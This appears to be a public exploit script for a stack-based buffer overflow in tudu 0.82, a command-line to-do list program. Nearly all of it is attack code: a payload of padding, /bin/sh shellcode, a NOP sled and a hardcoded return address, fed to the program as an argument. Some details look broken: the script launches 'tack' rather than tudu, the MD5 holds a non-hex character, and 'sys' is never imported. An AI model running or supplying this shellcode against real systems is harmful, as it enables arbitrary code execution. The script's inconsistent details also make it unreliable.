# Exploit Author: Juan Sacco - http://www.exploitpack.com <jsacco@exploitpack.com>
# Program: tudu - Command line hierarchical ToDo list
# Tested on: GNU/Linux - Kali Linux 2.0 x86
#
# Description: TUDU v0.82 and prior is prone to a stack-based buffer overflow
# vulnerability because the application fails to perform adequate
# boundary-checks on user-supplied input.
#
# An attacker could exploit this issue to execute arbitrary code in the
# context of the application. Failed exploit attempts will result in a
# denial-of-service condition.
#
# Vendor homepage: http://www.cauterized.net/~meskio/tudu
# Kali Linux 2.0 package: pool/main/t/tudu/tudu_0.8.2-1.deb
# MD5: 1dc2s2e9c374c9876b2b02283a9f5243

import os,subprocess
def run():
  try:
    print "# TUDU v0.82 Stack-Based Overflow by Juan Sacco"
    print "# It's Fuzzing time on unusable exploits"
    print "# This exploit is for educational purposes only"
    # Basic structure: JUNK + SHELLCODE + NOPS + EIP

    junk = "\x41"*10
    shellcode = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
    nops = "\x90"*124
    eip = "\x60\xd3\xff\xbf"
    subprocess.call(["tack",'  ', junk + shellcode + nops + eip])

  except OSError as e:
    if e.errno == os.errno.ENOENT:
        print "TUDU not found!"
    else:
        print "Error executing exploit"
    raise

def howtousage():
  print "Sorry, something went wrong"
  sys.exit(-1)

if __name__ == '__main__':
  try:
    print "Exploit TUDU 0.82 Local Overflow Exploit"
    print "Author: Juan Sacco"
  except IndexError:
    howtousage()
run()
